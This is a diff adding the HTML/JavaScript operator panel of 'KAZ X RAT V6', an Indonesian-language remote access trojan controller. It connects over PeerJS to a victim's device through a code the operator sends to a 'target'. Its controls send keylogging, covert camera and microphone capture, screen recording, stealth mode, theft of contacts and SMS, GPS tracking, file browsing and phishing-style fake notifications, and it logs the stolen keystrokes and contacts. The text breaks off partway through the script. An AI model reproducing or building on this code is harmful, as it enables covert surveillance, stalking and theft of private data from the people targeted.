+            #map { height: 150px; }
+            .file-list { max-height: 100px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== BACKGROUND VIDEO LOOP (MUTE) ===== -->
+    <video id="bg-video" autoplay loop muted playsinline>
+        <source src="https://files.catbox.moe/n6bhmk.mp4" type="video/mp4" />
+    </video>
+
+    <div id="blood-overlay"></div>
+    <div id="scanline"></div>
+
+    <!-- ===== HAMBURGER (kanan atas) ===== -->
+    <div id="hamburger-btn">
+        <div class="bar"></div>
+        <div class="bar"></div>
+        <div class="bar"></div>
+    </div>
+
+    <!-- ===== DROPDOWN MENU ===== -->
+    <div id="dropdown-menu">
+        <div class="menu-item" id="menu-logout">🚪 Logout</div>
+        <div class="menu-item" id="menu-music">🎵 Ganti Musik</div>
+        <div class="menu-item" id="menu-theme-neon"><span class="theme-dot" style="background:#ff00ff;"></span> Neon</div>
+        <div class="menu-item" id="menu-theme-cyberpunk"><span class="theme-dot" style="background:#00ffff;"></span> Cyberpunk</div>
+        <div class="menu-item" id="menu-theme-matrix"><span class="theme-dot" style="background:#00ff00;"></span> Matrix</div>
+        <div class="menu-item" id="menu-theme-bloodred"><span class="theme-dot" style="background:#ff0000;"></span> Blood Red</div>
+    </div>
+
+    <!-- ===== NOTIFIKASI ===== -->
+    <div id="notification">
+        <span class="notif-icon">✅</span>
+        <span id="notif-text">Aksi berhasil!</span>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 1 – INTRO FULL LAYAR -->
+    <!-- ========================================================= -->
+    <div id="intro-page" class="page active">
+        <div class="video-wrapper">
+            <video id="intro-video" playsinline preload="auto" loop>
+                <source src="https://files.catbox.moe/u6xyu9.mp4" type="video/mp4" />
+            </video>
+            <div class="crt-overlay"></div>
+            <button class="skip-btn" id="skip-intro">LEWATI &gt;</button>
+            <div class="title-overlay glitch-text">
+                KAZ X RAT V6
+                <small>Developer kaisar</small>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 2 – LOGIN -->
+    <!-- ========================================================= -->
+    <div id="login-page" class="page">
+        <div class="login-box">
+            <h1 class="glitch-text">KAZ X RAT V6</h1>
+            <div class="sub">⚡ login ke zona kematian ⚡</div>
+
+            <div class="input-group">
+                <label>👤 USERNAME</label>
+                <input type="text" id="username-input" placeholder="Username" />
+            </div>
+            <div class="input-group">
+                <label>🔑 PASSWORD</label>
+                <input type="password" id="password-input" placeholder="Password" />
+            </div>
+
+            <button class="btn-3d btn-login" id="btn-login">MASUK</button>
+            <div class="register-link" id="register-link">📝 buat akses baru</div>
+            <div class="dev-note">📱 dev <span>085194279722</span></div>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 3 – REGISTER -->
+    <!-- ========================================================= -->
+    <div id="register-page" class="page">
+        <div class="register-box">
+            <h1 class="glitch-text">📝 DAFTAR AKSES</h1>
+            <div class="sub">buat username & password sendiri</div>
+
+            <div class="input-group">
+                <label>👤 USERNAME BARU</label>
+                <input type="text" id="reg-username" placeholder="pilih username" />
+            </div>
+            <div class="input-group">
+                <label>🔑 PASSWORD BARU</label>
+                <input type="password" id="reg-password" placeholder="pilih password" />
+            </div>
+            <div class="input-group">
+                <label>🔒 KONFIRMASI PASSWORD</label>
+                <input type="password" id="reg-confirm" placeholder="ulangi password" />
+            </div>
+
+            <button class="btn-3d btn-register" id="btn-register">DAFTAR</button>
+            <div class="back-link" id="back-to-login">← kembali ke login</div>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 4 – MENU RAT V6 -->
+    <!-- ========================================================= -->
+    <div id="menu-page" class="page">
+        <div class="menu-box">
+            <h2 class="glitch-text hologram">🔥 KAZ X RAT V6</h2>
+            <div class="sub-title">⚡ PERMANENT CODE — KONTROL TOTAL</div>
+
+            <!-- PERMANENT CODE DISPLAY — JELAS & BESAR -->
+            <div class="permanent-code" id="permanentCodeDisplay">
+                <div class="label">📌 KODE PERMANEN ANDA</div>
+                <div class="code" id="userPermanentCode">————</div>
+                <div class="code-actions">
+                    <button class="btn btn-success btn-sm" id="btnCopyCode">📋 Copy</button>
+                </div>
+                <div class="hint">⚡ Kirim kode ini ke target — permanen & tidak bisa diganti</div>
+            </div>
+
+            <!-- TAB -->
+            <div class="tab-container">
+                <button class="tab-btn active" data-tab="tab-control">🎮 RAT</button>
+                <button class="tab-btn" data-tab="tab-file">📁 FILE</button>
+                <button class="tab-btn" data-tab="tab-map">📍 MAP</button>
+                <button class="tab-btn" data-tab="tab-stats">📊 STATS</button>
+            </div>
+
+            <!-- ===== PANEL RAT KONTROL ===== -->
+            <div class="panel active" id="tab-control">
+                <!-- Info Target -->
+                <div class="card">
+                    <div class="card-title">📱 INFO TARGET</div>
+                    <div class="card-row"><span class="label">Nama Perangkat</span><span class="value" id="deviceName">-</span></div>
+                    <div class="card-row"><span class="label">Baterai</span><span class="value" id="batteryStatus">-</span></div>
+                    <div class="card-row"><span class="label">Status</span><span class="value" id="connectionStatus">-</span></div>
+                </div>
+
+                <!-- Stream -->
+                <div class="card">
+                    <div class="card-title">📡 LIVE STREAM</div>
+                    <div class="stream-wrapper" id="streamWrapper">
+                        <video id="targetStream" autoplay playsinline style="display:none;"></video>
+                        <div class="placeholder" id="streamPlaceholder">
+                            📡 Layar target akan muncul di sini<br>
+                            <span style="font-size:0.7rem;color:#555;">Target input kode & klik verifikasi</span>
+                        </div>
+                    </div>
+                    <!-- ZOOM & FULLSCREEN -->
+                    <div class="zoom-control">
+                        <span style="color:#888; font-size:0.7rem;">Zoom:</span>
+                        <input type="range" id="zoomSlider" min="50" max="200" value="100">
+                        <span class="zoom-label" id="zoomLabel">100%</span>
+                        <button class="btn btn-secondary btn-sm" id="btnFullscreen" style="width:auto; padding:4px 12px;">⛶</button>
+                    </div>
+                </div>
+
+                <!-- Kontrol Cepat -->
+                <div class="card">
+                    <div class="card-title">🎮 KONTROL CEPAT</div>
+                    <div class="ctrl-grid">
+                        <button class="ctrl-btn" id="btnScreenshot"><span class="icon">📸</span><span class="label">Screenshot</span></button>
+                        <button class="ctrl-btn" id="btnScreenshotWA"><span class="icon">📤</span><span class="label">Screenshot → WA</span></button>
+                        <button class="ctrl-btn" id="btnNotif"><span class="icon">🔔</span><span class="label">Notif Palsu</span></button>
+                        <button class="ctrl-btn" id="btnLock"><span class="icon">🔒</span><span class="label">Kunci</span></button>
+                        <button class="ctrl-btn" id="btnUnlock"><span class="icon">🔓</span><span class="label">Buka</span></button>
+                        <button class="ctrl-btn" id="btnVibrate"><span class="icon">📳</span><span class="label">Getar</span></button>
+                        <button class="ctrl-btn" id="btnSound"><span class="icon">🔊</span><span class="label">Play Sound</span></button>
+                        <button class="ctrl-btn" id="btnKeylog"><span class="icon">⌨️</span><span class="label">Keylogger</span></button>
+                        <button class="ctrl-btn" id="btnCamFront"><span class="icon">📷</span><span class="label">Kamera Depan</span></button>
+                        <button class="ctrl-btn" id="btnCamBack"><span class="icon">📷</span><span class="label">Kamera Belakang</span></button>
+                        <button class="ctrl-btn" id="btnMic"><span class="icon">🎤</span><span class="label">Mikrofon</span></button>
+                        <button class="ctrl-btn" id="btnRecord"><span class="icon">🎬</span><span class="label">Rekam Layar</span></button>
+                        <button class="ctrl-btn" id="btnStealth"><span class="icon">🛡️</span><span class="label">Stealth Mode</span></button>
+                        <button class="ctrl-btn" id="btnBrightness"><span class="icon">🌗</span><span class="label">Kecerahan</span></button>
+                        <button class="ctrl-btn" id="btnVolume"><span class="icon">🔊</span><span class="label">Volume</span></button>
+                        <button class="ctrl-btn" id="btnFlash"><span class="icon">🔦</span><span class="label">Senter</span></button>
+                        <button class="ctrl-btn" id="btnPip"><span class="icon">📺</span><span class="label">PiP</span></button>
+                        <button class="ctrl-btn" id="btnAutoSS"><span class="icon">⏱️</span><span class="label">Auto SS</span></button>
+                        <button class="ctrl-btn" id="btnSoundDetect"><span class="icon">🔊</span><span class="label">Deteksi Suara</span></button>
+                        <button class="ctrl-btn" id="btnContacts"><span class="icon">📇</span><span class="label">Kontak</span></button>
+                        <button class="ctrl-btn" id="btnSms"><span class="icon">📨</span><span class="label">SMS</span></button>
+                        <button class="ctrl-btn" id="btnChat"><span class="icon">💬</span><span class="label">Chat Remote</span></button>
+                    </div>
+                </div>
+
+                <!-- Log -->
+                <div class="card">
+                    <div class="card-title">📜 LOG AKTIVITAS</div>
+                    <div class="log-box" id="logBox">
+                        <div class="log-entry"><span class="time">[Sistem]</span><span class="text">KAZ X RAT V6 siap...</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== PANEL FILE EXPLORER ===== -->
+            <div class="panel" id="tab-file">
+                <div class="card">
+                    <div class="card-title">📁 FILE EXPLORER</div>
+                    <div class="file-list" id="fileList">
+                        <div class="file-item"><span class="name">📂 /storage/emulated/0/</span><span class="size">-</span></div>
+                        <div class="file-item"><span class="name">📂 /sdcard/</span><span class="size">-</span></div>
+                        <div class="file-item"><span class="name">📂 /data/</span><span class="size">-</span></div>
+                    </div>
+                    <button class="btn btn-secondary btn-sm" id="btnRefreshFiles" style="margin-top:8px;">🔄 Refresh</button>
+                </div>
+            </div>
+
+            <!-- ===== PANEL MAP ===== -->
+            <div class="panel" id="tab-map">
+                <div class="card">
+                    <div class="card-title">📍 LOKASI GPS REAL-TIME</div>
+                    <div id="map"></div>
+                    <div style="margin-top:8px; font-size:0.8rem; color:#888; text-align:center;" id="locationInfo">Menunggu data lokasi...</div>
+                    <button class="btn btn-secondary btn-sm" id="btnGetLocation" style="margin-top:8px;">📍 Ambil Lokasi</button>
+                </div>
+            </div>
+
+            <!-- ===== PANEL STATISTIK ===== -->
+            <div class="panel" id="tab-stats">
+                <div class="card">
+                    <div class="card-title">📊 STATISTIK SERANGAN</div>
+                    <div class="stats-grid">
+                        <div class="stat-item"><div class="number" id="statTotal">0</div><div class="label">Total</div></div>
+                        <div class="stat-item"><div class="number" id="statToday">0</div><div class="label">Hari Ini</div></div>
+                        <div class="stat-item"><div class="number" id="statOnline">0</div><div class="label">Online</div></div>
+                        <div class="stat-item"><div class="number" id="statCommands">0</div><div class="label">Perintah</div></div>
+                    </div>
+                    <div class="chart-container">
+                        <canvas id="statsChart"></canvas>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 5 – SUCCESS -->
+    <!-- ========================================================= -->
+    <div id="success-page" class="page">
+        <div class="success-box">
+            <h1 class="glitch-text">🔥 SUCCESS 🔥</h1>
+            <p>Aksi berhasil!</p>
+            <button class="btn-3d btn-ok" id="btn-ok">OK</button>
+            <div class="speed">0.5x</div>
+        </div>
+    </div>
+
+    <script>
+        // =========================================================
+        // 1. ELEMEN REFS
+        // =========================================================
+        const pages = {
+            intro: document.getElementById('intro-page'),
+            login: document.getElementById('login-page'),
+            register: document.getElementById('register-page'),
+            menu: document.getElementById('menu-page'),
+            success: document.getElementById('success-page')
+        };
+
+        const introVideo = document.getElementById('intro-video');
+        const bgVideo = document.getElementById('bg-video');
+        const skipBtn = document.getElementById('skip-intro');
+
+        const usernameInput = document.getElementById('username-input');
+        const passwordInput = document.getElementById('password-input');
+        const btnLogin = document.getElementById('btn-login');
+        const registerLink = document.getElementById('register-link');
+
+        const regUsername = document.getElementById('reg-username');
+        const regPassword = document.getElementById('reg-password');
+        const regConfirm = document.getElementById('reg-confirm');
+        const btnRegister = document.getElementById('btn-register');
+        const backToLogin = document.getElementById('back-to-login');
+
+        const btnOk = document.getElementById('btn-ok');
+
+        // ===== PERMANENT CODE =====
+        const userPermanentCode = document.getElementById('userPermanentCode');
+        const btnCopyCode = document.getElementById('btnCopyCode');
+
+        // ===== CONTROL ELEMEN =====
+        const deviceName = document.getElementById('deviceName');
+        const batteryStatus = document.getElementById('batteryStatus');
+        const connectionStatus = document.getElementById('connectionStatus');
+        const targetStream = document.getElementById('targetStream');
+        const streamPlaceholder = document.getElementById('streamPlaceholder');
+        const logBox = document.getElementById('logBox');
+        const zoomSlider = document.getElementById('zoomSlider');
+        const zoomLabel = document.getElementById('zoomLabel');
+        const btnFullscreen = document.getElementById('btnFullscreen');
+
+        const btnScreenshot = document.getElementById('btnScreenshot');
+        const btnScreenshotWA = document.getElementById('btnScreenshotWA');
+        const btnNotif = document.getElementById('btnNotif');
+        const btnLock = document.getElementById('btnLock');
+        const btnUnlock = document.getElementById('btnUnlock');
+        const btnVibrate = document.getElementById('btnVibrate');
+        const btnSound = document.getElementById('btnSound');
+        const btnKeylog = document.getElementById('btnKeylog');
+        const btnCamFront = document.getElementById('btnCamFront');
+        const btnCamBack = document.getElementById('btnCamBack');
+        const btnMic = document.getElementById('btnMic');
+        const btnRecord = document.getElementById('btnRecord');
+        const btnStealth = document.getElementById('btnStealth');
+        const btnBrightness = document.getElementById('btnBrightness');
+        const btnVolume = document.getElementById('btnVolume');
+        const btnFlash = document.getElementById('btnFlash');
+        const btnPip = document.getElementById('btnPip');
+        const btnAutoSS = document.getElementById('btnAutoSS');
+        const btnSoundDetect = document.getElementById('btnSoundDetect');
+        const btnContacts = document.getElementById('btnContacts');
+        const btnSms = document.getElementById('btnSms');
+        const btnChat = document.getElementById('btnChat');
+
+        // ===== FILE ELEMEN =====
+        const fileList = document.getElementById('fileList');
+        const btnRefreshFiles = document.getElementById('btnRefreshFiles');
+
+        // ===== MAP ELEMEN =====
+        let map = null;
+        let marker = null;
+        const locationInfo = document.getElementById('locationInfo');
+        const btnGetLocation = document.getElementById('btnGetLocation');
+
+        // ===== STATS ELEMEN =====
+        const statTotal = document.getElementById('statTotal');
+        const statToday = document.getElementById('statToday');
+        const statOnline = document.getElementById('statOnline');
+        const statCommands = document.getElementById('statCommands');
+        let statsChart = null;
+
+        // ===== HAMBURGER =====
+        const hamburgerBtn = document.getElementById('hamburger-btn');
+        const dropdownMenu = document.getElementById('dropdown-menu');
+        const menuLogout = document.getElementById('menu-logout');
+        const menuMusic = document.getElementById('menu-music');
+
+        // ===== TABS =====
+        const tabBtns = document.querySelectorAll('.tab-btn');
+        const panels = {
+            control: document.getElementById('tab-control'),
+            file: document.getElementById('tab-file'),
+            map: document.getElementById('tab-map'),
+            stats: document.getElementById('tab-stats')
+        };
+
+        // =========================================================
+        // 2. SWITCH PAGE
+        // =========================================================
+        function showPage(name) {
+            Object.keys(pages).forEach(key => {
+                pages[key].classList.toggle('active', key === name);
+            });
+        }
+
+        // =========================================================
+        // 3. SET VOLUME & LOOP — MUSIK TETAP JALAN
+        // =========================================================
+        function setupMusic(video) {
+            video.preload = 'auto';
+            video.loop = true;
+            video.volume = 0.8;
+            video.muted = false;
+            video.addEventListener('ended', function() {
+                if (video.loop) {
+                    video.currentTime = 0;
+                    video.play().catch(() => {});
+                }
+            });
+        }
+        setupMusic(introVideo);
+        bgVideo.muted = true;
+        bgVideo.volume = 0;
+        bgVideo.loop = true;
+        bgVideo.preload = 'auto';
+
+        introVideo.addEventListener('loadedmetadata', function() { introVideo.volume = 0.8; });
+        bgVideo.addEventListener('loadedmetadata', function() {
+            bgVideo.muted = true;
+            bgVideo.volume = 0;
+            bgVideo.loop = true;
+            bgVideo.play().catch(() => {});
+        });
+
+        // =========================================================
+        // 4. INTRO – FULL LAYAR, LOOP, SKIP
+        // =========================================================
+        let introPlayed = false;
+
+        introVideo.addEventListener('canplaythrough', function() {
+            introVideo.play().catch(() => {});
+        });
+
+        introVideo.addEventListener('click', function() {
+            if (!introPlayed) {
+                introVideo.play().catch(() => {});
+                introPlayed = true;
+            } else {
+                if (introVideo.paused) {
+                    introVideo.play().catch(() => {});
+                } else {
+                    introVideo.pause();
+                }
+            }
+        });
+
+        function finishIntro() {
+            showPage('login');
+            bgVideo.play().catch(() => {});
+        }
+
+        skipBtn.addEventListener('click', function() { finishIntro(); });
+
+        // =========================================================
+        // 5. REGISTER + LOGIN + AUTO-LOGIN + PERMANENT CODE
+        // =========================================================
+        let registeredUsers = JSON.parse(localStorage.getItem('kazx999_users') || '[]');
+        let currentUser = JSON.parse(localStorage.getItem('kazx999_current') || 'null');
+
+        function generatePermanentCode() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let code = '';
+            for (let i = 0; i < 8; i++) {
+                code += chars[Math.floor(Math.random() * chars.length)];
+            }
+            if (registeredUsers.find(u => u.code === code)) {
+                return generatePermanentCode();
+            }
+            return code;
+        }
+
+        function displayPermanentCode(code) {
+            userPermanentCode.textContent = code || '————';
+        }
+
+        if (currentUser) {
+            const originalFinish = finishIntro;
+            finishIntro = function() {
+                showPage('menu');
+                bgVideo.play().catch(() => {});
+                displayPermanentCode(currentUser.code || '————');
+                initSession(currentUser.code);
+            };
+            skipBtn.onclick = finishIntro;
+            introVideo.addEventListener('timeupdate', function handler() {
+                if (introVideo.currentTime >= 23) {
+                    introVideo.removeEventListener('timeupdate', handler);
+                    finishIntro();
+                }
+            });
+        }
+
+        registerLink.addEventListener('click', function() { showPage('register'); });
+        backToLogin.addEventListener('click', function() { showPage('login'); });
+
+        btnRegister.addEventListener('click', function() {
+            const user = regUsername.value.trim();
+            const pass = regPassword.value.trim();
+            const confirm = regConfirm.value.trim();
+
+            if (!user || !pass || !confirm) { alert('⚠️ Semua field harus diisi!'); return; }
+            if (pass !== confirm) { alert('❌ Password dan konfirmasi tidak sama!'); return; }
+            if (registeredUsers.find(u => u.username === user)) { alert('❌ Username sudah terdaftar!'); return; }
+
+            const permanentCode = generatePermanentCode();
+
+            registeredUsers.push({ username: user, password: pass, code: permanentCode });
+            localStorage.setItem('kazx999_users', JSON.stringify(registeredUsers));
+            alert(`✅ Pendaftaran berhasil!\n📌 Kode permanen Anda: ${permanentCode}\nSimpan kode ini!`);
+            showPage('login');
+        });
+
+        btnLogin.addEventListener('click', function() {
+            const user = usernameInput.value.trim();
+            const pass = passwordInput.value.trim();
+            const found = registeredUsers.find(u => u.username === user && u.password === pass);
+            if (found) {
+                currentUser = found;
+                localStorage.setItem('kazx999_current', JSON.stringify(currentUser));
+                showPage('menu');
+                displayPermanentCode(currentUser.code);
+                initSession(currentUser.code);
+            } else {
+                alert('❌ Username atau password salah!');
+            }
+        });
+
+        // =========================================================
+        // 6. COPY KODE
+        // =========================================================
+        btnCopyCode.addEventListener('click', function() {
+            const code = userPermanentCode.textContent;
+            if (code && code !== '————') {
+                navigator.clipboard.writeText(code).then(() => {
+                    addLog('📋 Kode berhasil di-copy!', 'success');
+                    alert('✅ Kode berhasil di-copy: ' + code);
+                }).catch(() => {
+                    prompt('📋 Copy kode ini:', code);
+                });
+            } else {
+                alert('⚠️ Belum ada kode. Login/daftar dulu!');
+            }
+        });
+
+        // =========================================================
+        // 7. LOGOUT
+        // =========================================================
+        menuLogout.addEventListener('click', function() {
+            dropdownMenu.classList.remove('open');
+            localStorage.removeItem('kazx999_current');
+            currentUser = null;
+            showPage('login');
+            addLog('🚪 Logout berhasil', 'info');
+        });
+
+        // =========================================================
+        // 8. TABS
+        // =========================================================
+        tabBtns.forEach(btn => {
+            btn.addEventListener('click', function() {
+                tabBtns.forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                const tab = this.dataset.tab;
+                Object.keys(panels).forEach(key => {
+                    panels[key].classList.toggle('active', key === tab.replace('tab-', ''));
+                });
+                if (tab === 'tab-map' && map) {
+                    setTimeout(() => map.invalidateSize(), 300);
+                }
+                if (tab === 'tab-stats') {
+                    updateStatsDisplay();
+                }
+            });
+        });
+
+        // =========================================================
+        // 9. RAT CORE LOGIC (dengan permanent code)
+        // =========================================================
+        let peer = null;
+        let conn = null;
+        let isConnected = false;
+        let isStealth = false;
+        let autoSSInterval = null;
+        let soundDetectActive = false;
+        let logHistory = JSON.parse(localStorage.getItem('kazxrat_log') || '[]');
+
+        function addLog(text, type = 'info') {
+            const time = new Date().toLocaleTimeString();
+            const entry = { time, text, type };
+            logHistory.push(entry);
+            if (logHistory.length > 100) logHistory.shift();
+            localStorage.setItem('kazxrat_log', JSON.stringify(logHistory));
+            renderLog();
+            updateStats();
+        }
+
+        function renderLog() {
+            logBox.innerHTML = logHistory.map(e =>
+                `<div class="log-entry"><span class="time">[${e.time}]</span><span class="text ${e.type}">${e.text}</span></div>`
+            ).join('');
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+
+        function setStatusTarget(text) {
+            connectionStatus.textContent = text;
+        }
+
+        function initSession(permanentCode) {
+            if (!permanentCode) return;
+            if (peer) { peer.destroy(); }
+            const sessionId = 'kazx-' + permanentCode;
+
+            peer = new Peer(sessionId, {
+                debug: 0,
+                config: { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }] }
+            });
+
+            peer.on('open', (id) => {
+                addLog(`📡 Server siap — Kode: ${permanentCode}`, 'success');
+                setStatusTarget('Menunggu koneksi...');
+                document.getElementById('statusDotGen').className = 'status-dot waiting';
+                document.getElementById('statusTextGen').textContent = 'Menunggu target...';
+                document.getElementById('targetInfoGen').textContent = `Kode: ${permanentCode}`;
+            });
+
+            peer.on('connection', (incoming) => {
+                conn = incoming;
+                conn.on('open', () => {
+                    isConnected = true;
+                    setStatusTarget('🟢 Online');
+                    addLog(`✅ Target terhubung! Kode: ${permanentCode}`, 'success');
+                    streamPlaceholder.style.display = 'none';
+                    targetStream.style.display = 'block';
+                    document.getElementById('statusDotGen').className = 'status-dot online';
+                    document.getElementById('statusTextGen').textContent = '🟢 Target terhubung!';
+                    getDeviceInfo();
+                    getBatteryInfo();
+                    updateStats();
+                });
+                conn.on('data', (data) => {
+                    handleData(data);
+                });
+                conn.on('close', () => {
+                    isConnected = false;
+                    setStatusTarget('❌ Offline');
+                    addLog(`❌ Target putus — Kode: ${permanentCode}`, 'error');
+                    streamPlaceholder.style.display = 'flex';
+                    targetStream.style.display = 'none';
+                    targetStream.srcObject = null;
+                    deviceName.textContent = '-';
+                    batteryStatus.textContent = '-';
+                    document.getElementById('statusDotGen').className = 'status-dot offline';
+                    document.getElementById('statusTextGen').textContent = '❌ Target putus';
+                    updateStats();
+                    stopAutoSS();
+                });
+            });
+
+            peer.on('error', (err) => {
+                addLog(`⚠️ Error: ${err.message}`, 'error');
+                setStatusTarget('Error');
+            });
+        }
+
+        function getDeviceInfo() {
+            if (conn && isConnected) {
+                conn.send({ type: 'get_device_info' });
+            }
+        }
+
+        function getBatteryInfo() {
+            if (conn && isConnected) {
+                conn.send({ type: 'get_battery' });
+            }
+        }
+
+        function handleData(data) {
+            if (data.type === 'device_info') {
+                deviceName.textContent = data.deviceName || 'Unknown';
+                addLog(`📱 Perangkat: ${data.deviceName}`, 'success');
+            } else if (data.type === 'battery_info') {
+                batteryStatus.textContent = data.level + '%' + (data.charging ? ' ⚡ Charging' : '');
+                addLog(`🔋 Baterai: ${data.level}%`, 'info');
+            } else if (data.type === 'stream') {
+                addLog(`📡 Menerima stream`, 'success');
+            } else if (data.type === 'screenshot') {
+                addLog(`📸 Screenshot diterima`, 'success');
+                if (data.image) {
+                    const img = document.createElement('img');
+                    img.src = data.image;
+                    img.style.maxWidth = '100%';
+                    img.style.borderRadius = '12px';
+                    img.style.marginTop = '8px';
+                    logBox.appendChild(img);
+                    logBox.scrollTop = logBox.scrollHeight;
+                }
+            } else if (data.type === 'notif') {
+                addLog(`🔔 Notifikasi dikirim`, 'success');
+            } else if (data.type === 'lock') {
+                addLog(`🔒 Layar dikunci`, 'success');
+            } else if (data.type === 'unlock') {
+                addLog(`🔓 Layar dibuka`, 'success');
+            } else if (data.type === 'vibrate') {
+                addLog(`📳 Getaran dikirim`, 'success');
+            } else if (data.type === 'sound') {
+                addLog(`🔊 Sound dikirim`, 'success');
+            } else if (data.type === 'keylog') {
+                addLog(`⌨️ Keylogger aktif`, 'keylog');
+            } else if (data.type === 'keylog_data') {
+                addLog(`⌨️ Keylog: ${data.text}`, 'keylog');
+            } else if (data.type === 'camera') {
+                addLog(`📷 Kamera diaktifkan`, 'success');
+                if (data.image) {
+                    const img = document.createElement('img');
+                    img.src = data.image;
+                    img.style.maxWidth = '100%';
+                    img.style.borderRadius = '12px';
+                    img.style.marginTop = '8px';
+                    logBox.appendChild(img);
+                    logBox.scrollTop = logBox.scrollHeight;
+                }
+                if (data.face) {
+                    addLog(`👤 Deteksi Wajah: ${data.face}`, 'keylog');
+                }
+            } else if (data.type === 'mic') {
+                addLog(`🎤 Mikrofon diaktifkan`, 'success');
+            } else if (data.type === 'record') {
+                addLog(`🎬 Rekaman layar dimulai`, 'success');
+            } else if (data.type === 'file_list') {
+                renderFileList(data.files);
+            } else if (data.type === 'location') {
+                updateMap(data.lat, data.lon, data.accuracy);
+            } else if (data.type === 'brightness_done') {
+                addLog(`🌗 Kecerahan diatur ke ${data.level}%`, 'success');
+            } else if (data.type === 'volume_done') {
+                addLog(`🔊 Volume diatur ke ${data.level}%`, 'success');
+            } else if (data.type === 'flash_done') {
+                addLog(`🔦 Senter dinyalakan`, 'success');
+            } else if (data.type === 'contacts') {
+                addLog(`📇 Kontak diterima (${data.count || 0})`, 'success');
+                if (data.contacts) {
+                    data.contacts.forEach(c => {
+                        addLog(`📇 ${c.name}: ${c.number}`, 'keylog');
+                    });
+                }
+            } else if (data.type === 'sms') {
+                addLog(`📨 SMS diterima`, 'success');
+                if (data.sms) {
+                    addLog(`📨 ${data.sms}`, 'keylog');
+                }
+            } else if (data.type === 'chat') {
+                addLog(`💬 Pesan remote dikirim: ${data.message}`, 'success');
+            } else if (data.type === 'sound_detect') {
+                addLog(`🔊 Suara keras terdeteksi!`, 'error');
+            } else {
+                addLog(`📨 Data: ${JSON.stringify(data)}`, 'info');
+            }
+        }
+
+        function sendCommand(type, payload = {}) {
+            if (!conn || !isConnected) {
+                addLog(`⚠️ Target tidak terhubung!`, 'error');
+                return;
+            }
+            conn.send({ type, ...payload });
+            addLog(`📤 Perintah dikirim: ${type}`, 'info');
+            updateStats();
+        }
+
+        // =========================================================
+        // 10. ZOOM & FULLSCREEN
+        // =========================================================
+        zoomSlider.addEventListener('input', function() {
+            const val = this.value;
+            zoomLabel.textContent = val + '%';
+            targetStream.style.transform = `scale(${val/100})`;
+            targetStream.style.transformOrigin = 'center center';
+        });
+
+        btnFullscreen.addEventListener('click', function() {
+            const wrapper = document.getElementById('streamWrapper');
+            if (!document.fullscreenElement) {
+                wrapper.requestFullscreen().catch(() => {});
+            } else {
+                document.exitFullscreen();
+            }
+        });
+
+        // =========================================================
+        // 11. CONTROL EVENTS (semua fitur)
+        // =========================================================
+        btnScreenshot.addEventListener('click', () => { sendCommand('screenshot'); });
+        btnScreenshotWA.addEventListener('click', () => {
+            if (!isConnected) { addLog('⚠️ Target tidak terhubung!', 'error'); return; }
+            sendCommand('screenshot');
+            const waLink = `https://wa.me/6285148162990?text=Screenshot+diambil+oleh+KAZ+X+RAT+V6`;
+            window.open(waLink, '_blank');
+            addLog('📤 Screenshot dikirim ke WhatsApp target', 'success');
+        });
+        btnNotif.addEventListener('click', () => {
+            const msg = prompt('📨 Pesan notifikasi palsu:', 'Sistem mendeteksi aktivitas mencurigakan. Klik OK untuk verifikasi.');
+            if (msg) sendCommand('notif', { message: msg });
+        });
+        btnLock.addEventListener('click', () => { sendCommand('lock'); });
+        btnUnlock.addEventListener('click', () => { sendCommand('unlock'); });
+        btnVibrate.addEventListener('click', () => { sendCommand('vibrate'); });
+        btnSound.addEventListener('click', () => { sendCommand('sound'); });
+        btnKeylog.addEventListener('click', () => {
+            sendCommand('keylog');
+            addLog('⌨️ Keylogger aktif — tunggu data', 'keylog');
+        });
+        btnCamFront.addEventListener('click', () => {
+            sendCommand('camera', { facing: 'front' });
+        });
+        btnCamBack.addEventListener('click', () => {
+            sendCommand('camera', { facing: 'back' });
+        });
+        btnMic.addEventListener('click', () => {
+            sendCommand('mic');
+            addLog('🎤 Mikrofon diaktifkan', 'success');
+        });
+        btnRecord.addEventListener('click', () => {
+            sendCommand('record');
+            addLog('🎬 Rekaman layar dimulai', 'success');
+        });
+        btnStealth.addEventListener('click', () => {
+            isStealth = !isStealth;
+            sendCommand('stealth', { enabled: isStealth });
+            addLog(`🛡️ Stealth Mode: ${isStealth ? 'AKTIF' : 'NONAKTIF'}`, 'keylog');
+            btnStealth.style.borderColor = isStealth ? '#44ff88' : '';
+            btnStealth.style.background = isStealth ? 'rgba(68,255,136,0.1)' : '';
+        });
+        btnBrightness.addEventListener('click', () => {
+            const level = prompt('🌗 Atur kecerahan (0-100):', '80');
+            if (level !== null && !isNaN(level) && level >= 0 && level <= 100) {
+                sendCommand('brightness', { level: parseInt(level) });
+            } else {
+                addLog('⚠️ Masukkan angka 0-100!', 'error');
+            }
+        });
+        btnVolume.addEventListener('click', () => {
+            const level = prompt('🔊 Atur volume (0-100):', '70');
+            if (level !== null && !isNaN(level) && level >= 0 && level <= 100) {
+                sendCommand('volume', { level: parseInt(level) });
+            } else {
+                addLog('⚠️ Masukkan angka 0-100!', 'error');
+            }
+        });
+        btnFlash.addEventListener('click', () => {
+            sendCommand('flash');
+            addLog('🔦 Perintah senter dikirim ke target', 'success');
+        });
+        btnPip.addEventListener('click', () => {
+            if (targetStream && document.pictureInPictureEnabled) {
+                if (!document.pictureInPictureElement) {
+                    targetStream.requestPictureInPicture().catch(() => {});
+                } else {
+                    document.exitPictureInPicture();
+                }
+            } else {
+                addLog('⚠️ Picture-in-Picture tidak didukung', 'error');
+            }
+        });
+        btnAutoSS.addEventListener('click', () => {
+            if (autoSSInterval) {
+                clearInterval(autoSSInterval);
+                autoSSInterval = null;
+                addLog('⏱️ Auto Screenshot dihentikan', 'info');
+                return;
+            }
+            const interval = prompt('⏱️ Atur jeda screenshot (detik):', '10');
+            if (interval && !isNaN(interval) && interval > 0) {
+                autoSSInterval = setInterval(() => {
+                    sendCommand('screenshot');
